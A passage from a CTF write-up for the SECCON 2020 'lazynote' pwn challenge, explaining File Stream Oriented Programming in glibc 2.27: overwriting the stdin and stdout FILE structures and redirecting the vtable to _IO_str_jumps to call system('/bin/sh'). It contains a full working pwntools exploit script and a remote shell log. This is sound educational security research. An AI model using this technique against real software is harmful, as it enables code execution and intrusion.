fake += p64(stdout) # _IO_buf_base, we are overwriting stdout
fake += p64(stdout + 0x2000) # _IO_buf_end, we can overwrite 0x2000 bytes
fake = fake.ljust(0x84, b"\x00") # 0x84 byte padding to get to the next `fgets`

# This is the fourth and final `fgets`
p.send(fake)
```

I've left the `_flags` field as the default that it has been this entire time. 

I set `_IO_read_ptr` to the address of `stdin`'s file structure, since it needs to be a valid address. 

Subsequently, I set `_IO_read_end` to 0, which is definitely less than the address of `stdin`'s file structure. This will cause `_IO_getline_info` to loop and call `_IO_new_file_underflow` again, which will let us read into `_IO_buf_base`, which we set below.

All the other pointers up to `_IO_write_end` can also be set to 0 because they aren't dereferenced within any of the functions that are getting called.

I set `_IO_buf_base` to `stdout`, and `_IO_buf_end` to `stdout + 0x2000`. This lets us overwrite `0x2000` bytes starting from `stdout`'s file structure (remember that the `_IO_SYSREAD` function used `_IO_buf_base` as the `buf` argument, and `_IO_buf_end - _IO_buf_base` as the size argument).

Why are we overwriting `stdout`'s file structure? Because this is what lets us get code execution through FSOP.

# File Stream Oriented Programming in libc-2.27

When I was searching for things to overwrite in libc, I found [this post on ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24/) that explained a technique that you could use to hijack code execution through `_IO_str_overflow`. It doesn't do that great of a job of explaining it though, so I had to do a lot of trial and error and figure stuff out myself. Below is my explanation for it, which I hope is much easier to understand.

The core idea of File Stream Oriented Programming was created back before libc-2.24. After libc-2.24, there were a couple of new vtable checks added that prevented the old techniques from working anymore. In this section, I'll explain File Stream Oriented Programming as it works in libc-2.27.

Remember when reading the code for `puts`, it ends up making a call to a function called `_IO_new_file_overflow`? Well, this function isn't actually called directly. The `stdout` file structure has a pointer to a vtable, and this vtable is what actually stores a pointer to this function:

```
gef➤  p _IO_2_1_stdout_
$1 = {
  file = {
    // [ ... ]
  },
  vtable = 0x7f7c7d6e82a0 <__GI__IO_file_jumps> // ## vtable
}

// ## Print the vtable
gef➤  p __GI__IO_file_jumps
$2 = {
  __dummy = 0x0,
  __dummy2 = 0x0,
  __finish = 0x7f7c7d38c3a0 <_IO_new_file_finish>,
  __overflow = 0x7f7c7d38d370 <_IO_new_file_overflow>,
  // [ ... ]
}
```

So when `puts` calls into `_IO_new_file_overflow`, it actually goes into `stdout`'s `vtable` and calls the `__overflow` pointer. With our arbitrary write primitive, we have the ability to overwrite this `vtable` pointer to, say, a forged vtable (on the heap somewhere, for example) that has the address of `system` at the same offset as `__overflow`. Later, when `puts` attempts to call `_IO_new_file_overflow`, it would end up using our forged vtable, which would cause it to call `system`!

This idea would have worked before libc-2.24. Unfortunately, with libc-2.24 came the following check:

```c
// libio/libioP.h:863

/* Perform vtable pointer validation.  If validation fails, terminate           
   the process.  */                                                             
static inline const struct _IO_jump_t *                                         
IO_validate_vtable (const struct _IO_jump_t *vtable)                            
{                                                                               
  /* Fast path: The vtable pointer is within the __libc_IO_vtables              
     section.  */                                                               
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  const char *ptr = (const char *) vtable;                                      
  uintptr_t offset = ptr - __start___libc_IO_vtables;                           
  if (__glibc_unlikely (offset >= section_length))                              
    /* The vtable pointer is not in the expected section.  Use the              
       slow path, which will terminate the process if necessary.  */            
    _IO_vtable_check ();                                                        
  return vtable;                                                                
}
```

Any time the `vtable` pointer is now accessed, this function is called. It basically has a start and end region between which the file structure vtables exist, and it ensures the vtable that is being accessed is within this memory region. This memory region is also not writable, so we can't forge a vtable ourselves and place it here. If we now try to access a forged vtable that's on the heap, this function will immediately cause the program to abort.

So what is the solution to bypass such a check? Well, if you noticed above, the `vtable` pointer actually points to a structure called the `__GI__IO_file_jumps`. This is not the only vtable in libc! In fact, there are a few others defined that you can find in the libc source code using the following grep:

```
$ rg "_IO_.*_jumps libio_vtable ="
stdio-common/vfprintf.c
2248:static const struct _IO_jump_t _IO_helper_jumps libio_vtable =
2270:static const struct _IO_jump_t _IO_helper_jumps libio_vtable =

debug/vsprintf_chk.c
35:static const struct _IO_jump_t _IO_str_chk_jumps libio_vtable =

libio/memstream.c
36:static const struct _IO_jump_t _IO_mem_jumps libio_vtable =

libio/iofopncook.c
121:static const struct _IO_jump_t _IO_cookie_jumps libio_vtable = {
255:static const struct _IO_jump_t _IO_old_cookie_jumps libio_vtable = {

libio/wfileops.c
1024:const struct _IO_jump_t _IO_wfile_jumps libio_vtable =

libio/iopopen.c
257:static const struct _IO_jump_t _IO_proc_jumps libio_vtable = {

libio/oldiopopen.c
215:const struct _IO_jump_t _IO_old_proc_jumps libio_vtable = {

libio/fileops.c
1455:const struct _IO_jump_t _IO_file_jumps libio_vtable =

libio/strops.c
355:const struct _IO_jump_t _IO_str_jumps libio_vtable =

libio/oldfileops.c
729:const struct _IO_jump_t _IO_old_file_jumps libio_vtable =

libio/wmemstream.c
37:static const struct _IO_jump_t _IO_wmem_jumps libio_vtable =

libio/wstrops.c
366:const struct _IO_jump_t _IO_wstr_jumps libio_vtable =
```

Each of these vtables are for a certain type of file structure. In the case of the `stdin`, `stdout`, and `stderr` file structures, they all use the `_IO_file_jumps` vtable by default.

Out of all of these vtables, there exists one called `_IO_str_jumps` which is what interests us. Why? Well, remember that `__overflow` function pointer that exists on `stdout`'s `vtable` pointer? Well, on the `_IO_str_jumps` vtable, there exists another `__overflow` pointer to a function called `_IO_str_overflow` at the same offset:

```
// ## vtable for stdout
gef➤  p _IO_file_jumps
$2 = {
  __dummy = 0x0,
  __dummy2 = 0x0,
  __finish = 0x7f7c7d38c3a0 <_IO_new_file_finish>,
  __overflow = 0x7f7c7d38d370 <_IO_new_file_overflow>,
  // [ ... ]
}

// ## The vtable that interests us
gef➤  p _IO_str_jumps
$1 = {
  __dummy = 0x0,
  __dummy2 = 0x0,
  __finish = 0x7f8c6ae71370 <_IO_str_finish>,
  __overflow = 0x7f8c6ae70fd0 <__GI__IO_str_overflow>,
  // [ ... ]
}
```

But what's so interesting about this function? Let's look at the code:

```c
int                                                                             
_IO_str_overflow (_IO_FILE *fp, int c)                                          
{                                                                               
  int flush_only = c == EOF;                                                    
  _IO_size_t pos;                                                               
  if (fp->_flags & _IO_NO_WRITES) // ## False by default for stdout                                            
      return flush_only ? 0 : EOF;                                              
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING)) 
    {                                                                           
      // ## False by default for stdout (we are currently in puts)                           
    }                                                                           
  pos = fp->_IO_write_ptr - fp->_IO_write_base;                            
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only)) // ## [ 1 ]                 
    {                                                                           
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */  // ## [ 2 ]              
    return EOF;                                                                 
      else                                                                      
    {                                                                           
      char *new_buf;                                                            
      char *old_buf = fp->_IO_buf_base;                                         
      size_t old_blen = _IO_blen (fp);                                          
      _IO_size_t new_size = 2 * old_blen + 100; // ## [ 3 ]                              
      if (new_size < old_blen)                                                  
        return EOF;                                                             
      new_buf                                                                   
        = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size); // ## [ 4 ]
      
      // ## [ ... ]
    }
    }

  // ## [ ... ]
}
```

The most important part of the code is at `[ 4 ]`. It makes a call to `(fp->_s._allocate_buffer)(new_size)`. This is dereferencing `fp`, which is just the `stdout` file structure, which is writable! So with our arbitrary write primitive, we can do the following:

1. Overwrite `stdout`'s `vtable` pointer to point to `_IO_str_jumps`.
2. Overwrite this `_s._allocate_buffer` pointer in `stdout` to the address of `system`, and ensure that `new_size` is set to the address of `/bin/sh`. 

On the next `puts` call, when it attempts to call `_IO_new_file_overflow`, it will instead call `_IO_str_overflow` (since the vtable was overwritten by us), which will in turn call `system("/bin/sh")`! This is the main idea behind using FSOP in libc-2.27 to gain code execution.

There are some constraints though. If you look at the code, we have to ensure the following:

1. At `[ 1 ]`, we have to ensure that `pos >= _IO_blen (fp)` (`flush_only` is always set to 0). `_IO_blen (fp)` just calculates `_IO_buf_end - _IO_buf_base`, so we just have to ensure that `_IO_write_ptr - _IO_write_base` is greater than or equal to `_IO_buf_end - _IO_buf_base` (remember that we can control all of these pointers using our arbitrary write primitive).
2. At `[ 2 ]`, we have to ensure that the `_IO_USER_BUF` flag is not set. This is set by default, so we need to unset it with our arbitrary write primitive.
3. At `[ 3 ]`, we can see the `new_size` variable being calculated using `old_blen`, which is again just `_IO_blen (fp)`. We can control both `_IO_buf_end` and `_IO_buf_base` (as explained above), so we can have `_IO_blen (fp)` set to `(addrof("/bin/sh") - 100) / 2`, which will then cause `new_size`'s calculation to end up with `new_size == addrof("/bin/sh")`.

Provided we do all of the above, we can finally get code execution. The rest of my exploit script is as follows:

```python
# This is the fourth and final `fgets`
p.send(fake)

# We overwrote `_IO_buf_base` to `stdout`, and `_IO_buf_end` to `stdout+0x2000`
# so now we will be able to read 0x2000 bytes into the `stdout` structure when
# _IO_getline_info loops again

# Overwriting the `stdout` file structure
fake  = p64(0xfbad2886) # original _flags & ~_IO_USER_BUF
fake += p64(stdout) * 4 # _IO_read_ptr to _IO_write_base
fake += p64((bin_sh - 100) // 2) # _IO_write_ptr // ## [ 1 ]
fake += p64(0) * 2 # _IO_write_end and _IO_buf_base // ## [ 2 ]
fake += p64((bin_sh - 100) // 2) # _IO_buf_end // ## [ 3 ]
fake += p64(0) * 4 # _IO_save_base to _markers
fake += p64(stdin) # _chain
fake += p32(1) # _fileno
fake += p32(0) # _flags2
fake += p64(0xffffffffffffffff) # _old_offset
fake += p16(0) # _cur_column
fake += p8(0) # _vtable_offset
fake += b'\n' # _shortbuf
fake += p32(0) # padding between shortbuf and _lock
fake += p64(stdfile_lock) # _lock
fake += p64(0xffffffffffffffff) # _offset
fake += p64(0) # _codecvt
fake += p64(wide_data) # _wide_data
fake += p64(0) # _freeres_list
fake += p64(0) #_freeres_buf
fake += p64(0) #__pad5
fake += p32(0xffffffff) # _mode
fake += b'\0'*20 # _unused2
fake += p64(io_str_jumps) # vtable // ## [ 4 ]
fake += p64(system) # _s._allocate_buffer // ## [ 5 ]
fake += p64(stdout) # _s._free_buffer

p.sendline(fake)

p.interactive()
```

The exploit has done all of the things I mentioned above.

At `[ 1 ]`, I ensure to set `_IO_write_ptr` to `(addrof(bin_sh) - 100) // 2` (we have to use the `//` operator to get an integer, as `p64` fails to work otherwise).

At `[ 2 ]`, I ensure to set both `_IO_write_base` and `_IO_buf_base` to 0. This causes that `pos = fp->_IO_write_ptr - fp->_IO_write_base` calculation to just return `_IO_write_ptr`.

At `[ 3 ]`, I ensure to set `_IO_buf_end` to the same value as `_IO_write_ptr`. This causes the `_IO_blen (fp)` call to return the same value as `_IO_buf_end` (since `_IO_buf_base` is set to 0), which is in turn the same as `_IO_write_ptr`. This causes the `pos >= _IO_blen (fp)` check to pass, which gets the program to call `(fp->_s._allocate_buffer)(new_size)`. Remember that `new_size` will be calculated to be the address of `"/bin/sh"` in libc.

All the other fields are simply set to what they were originally. This is where the `wide_data` and `stdfile_lock` pointers that we leaked come into play. We ensure that they remain unmodified so that the `stdout` file structure actually works. You can simply view the `stdout` file structure while its unmodified to record its state, and ensure that everything stays the same here.

Once we get to the `vtable` pointer, we overwrite it with `_IO_str_jumps` as explained previously. We then set `_s._allocate_buffer` to `system`'s address, and ensure that `_s._free_buffer` remains unmodified (it was previously set to the address of `stdout`.

We can check these pointers by doing the following in GDB:

```
gef➤  p *(_IO_strfile *) &_IO_2_1_stdout_
$1 = {
  _sbf = {
    _f = {
        // ## [ ... ]
    },
    vtable = 0x7f64daf872a0 <__GI__IO_file_jumps>
  },
  _s = {
    _allocate_buffer = 0x7f64daf8b680 <_IO_2_1_stderr_>,
    _free_buffer = 0x7f64daf8b760 <_IO_2_1_stdout_>
  }
}
```

Once this final payload is sent through, something causes `stdin`'s file structure to reset (I'm not sure what exactly). This resets `_IO_read_end` and `_IO_read_ptr`, and makes it so that `_IO_getline_info` stops looping. This will exit `fgets`, which will then cause the program to call `puts`. `puts` will attempt to call `_IO_new_file_overflow`, but since we overwrote the `vtable` pointer, it will instead call `_IO_str_overflow`, which will then end up calling `system("/bin/sh")` and give us a shell.

I ran my exploit against the remote server (it is surprisingly up 2 days after the CTF has ended!):
```
$ ./exploit.py 
[*] '/home/faith/projects/ctf/seccon-2020/lazynote/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[*] '/home/faith/projects/ctf/seccon-2020/lazynote/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn-neko.chal.seccon.jp on port 9003: Done
[*] LIBC leak: 0x7fdffb05a8b0
[*] LIBC base: 0x7fdffac6d000
[*] system@LIBC: 0x7fdffacbc4e0
[*] /bin/sh: 0x7fdffae210fa
[*] _IO_2_1_stdout_: 0x7fdffb059760
[*] _IO_2_1_stdin_: 0x7fdffb058a00
[*] Switching to interactive mode

> $ ls
chall
flag-fa782be4dfb69fb423613b8ad35c1e28.txt
redir.sh
$ cat flag-fa782be4dfb69fb423613b8ad35c1e28.txt
SECCON{r3l4t1v3_nu11_wr1t3_pr1m1t1v3_2_sh3ll}$ 
```

# Conclusion

Learning about FSOP for the first time was a treat. I can't wait to get back into the CTF scene and start playing more and more. University is finally coming to an end soon, and I can't wait to finally be able to spend all my time playing CTFs and doing vulnerability research. Sounds like heaven to me!

# Final exploit script

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"

elf  = ELF("./chall")
libc = ELF("./libc-2.27.so")
#p    = process("./chall", env={"LD_PRELOAD": "./libc-2.27.so"})
p    = remote("pwn-neko.chal.seccon.jp", 9003)
REMOTE = True

def create1(alloc_size, read_size, data):
        p.recv()
        p.sendline("1")
        p.recv()
        p.sendline(str(alloc_size))
        p.recv()
        p.sendline(str(read_size))
        p.recv()
        p.sendline(data)

def create2(alloc_size, read_size, data):
    p.sendline("1")
    p.sendline(str(alloc_size))
    p.sendline(str(read_size))
    p.sendline(data)

# Overwrite LSB of `_IO_read_end` in `stdout`
create1(0x200000, 0x5ed761, "A")

# Overwrite LSB of `_IO_write_base` in `stdout`
create2(0x200000, 0x5e6761 + 0x208010, "A")

# Have to recv for the remote, else it doesn't work???
if REMOTE:
    p.recv()

leak         = u64(p.recvline()[8:14].ljust(8, b'\x00'))
libc.address = leak - 0x3ed8b0
system       = libc.sym["system"]
bin_sh       = next(libc.search(b"/bin/sh"))
stdout       = libc.sym["_IO_2_1_stdout_"]
stdin        = libc.sym["_IO_2_1_stdin_"]
stdfile_lock = libc.sym["_IO_stdfile_1_lock"]
wide_data    = libc.sym["_IO_wide_data_1"]
io_str_jumps = libc.sym["_IO_str_jumps"]

log.info("LIBC leak: " + hex(leak))
log.info("LIBC base: " + hex(libc.address))
log.info("system@LIBC: " + hex(system))
log.info("/bin/sh: " + hex(bin_sh))
log.info("_IO_2_1_stdout_: " + hex(stdout))
log.info("_IO_2_1_stdin_: " + hex(stdin))

# Now that the stdout buffer has been cleared, we will actually receive the
# output from the program, so we use create1

# Overwrite the LSB of `_IO_buf_base` in `stdin`, third `fgets
create1(0x200000, 0x5e6761 + 0x208010 + 0x2002b8, "A")

# We can now overwrite 0x84 bytes of the `stdin` structure on the next `fgets`

# Overwriting the `stdin` file structure
fake  = p64(0xfbad208b) # _flags as they were before
fake += p64(stdin) # _IO_read_ptr (needs to be a valid pointer)
fake += p64(0) * 5 # _IO_read_end to _IO_write_end can all be 0
fake += p64(stdout) # _IO_buf_base, we are overwriting stdout
fake += p64(stdout + 0x2000) # _IO_buf_end, we can overwrite 0x2000 bytes
fake = fake.ljust(0x84, b"\x00") # 0x84 byte padding to get to the next `fgets`

# This is the fourth and final `fgets`
p.send(fake)

# We overwrote `_IO_buf_base` to `stdout`, and `_IO_buf_end` to `stdout+0x2000`
# so now we will be able to read 0x2000 bytes into the `stdout` structure when
# _IO_getline_info loops again

# Overwriting the `stdout` file structure
fake  = p64(0xfbad2886) # original _flags & ~_IO_USER_BUF
fake += p64(stdout) * 4 # _IO_read_ptr to _IO_write_base
fake += p64((bin_sh - 100) // 2) # _IO_write_ptr
fake += p64(0) * 2 # _IO_write_end and _IO_buf_base
fake += p64((bin_sh - 100) // 2) # _IO_buf_end
fake += p64(0) * 4 # _IO_save_base to _markers
fake += p64(stdin) # _chain
fake += p32(1) # _fileno
fake += p32(0) # _flags2
fake += p64(0xffffffffffffffff) # _old_offset
fake += p16(0) # _cur_column
fake += p8(0) # _vtable_offset
fake += b'\n' # _shortbuf
fake += p32(0) # padding between shortbuf and _lock
fake += p64(stdfile_lock) # _lock
fake += p64(0xffffffffffffffff) # _offset
fake += p64(0) # _codecvt
fake += p64(wide_data) # _wide_data
fake += p64(0) # _freeres_list
fake += p64(0) #_freeres_buf
fake += p64(0) #__pad5
fake += p32(0xffffffff) # _mode
fake += b'\0'*20 # _unused2
fake += p64(io_str_jumps) # vtable
fake += p64(system) # _s._allocate_buffer
fake += p64(stdout) # _s._free_buffer

p.sendline(fake)

p.interactive()
```
